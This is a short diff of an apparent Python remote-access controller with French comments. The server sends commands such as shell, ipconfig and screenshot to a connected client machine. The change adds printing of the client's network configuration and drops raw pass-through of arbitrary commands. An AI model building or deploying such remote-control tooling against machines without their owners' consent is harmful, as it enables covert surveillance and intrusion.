@@ -24,6 +24,8 @@ def shell(client_socket) :
 # Fonction permettant de récupérer la configuration réseau du client
 def ipconfig(client_socket) :
     client_socket.send(b'ipconfig') # Envoie de la commande
+    conf_received = client_socket.recv(4096).decode() # Récupération des données de la configuration
+    print(conf_received) # Afficahge de la configuration
 
 # Fonction permettant de récupérer la capture d'écran du client
 def screenshot(client_socket, nb_screenshot) :
@@ -99,9 +101,8 @@ def main() :
                 client_socket.send(b'exit')
                 break
             else:
-                client_socket.send(command.encode())
-                result = client_socket.recv(1024).decode()
-                print(result)
+                print("[!] Commande non reconnue") # Gestion des saisis utilisateur
+                print("[*] Taper 'help' pour voir la liste des commandes disponibles")
 
         client_socket.close() # Fermeture du socket client
     server_socket.close() # Fermeture du socket serveur
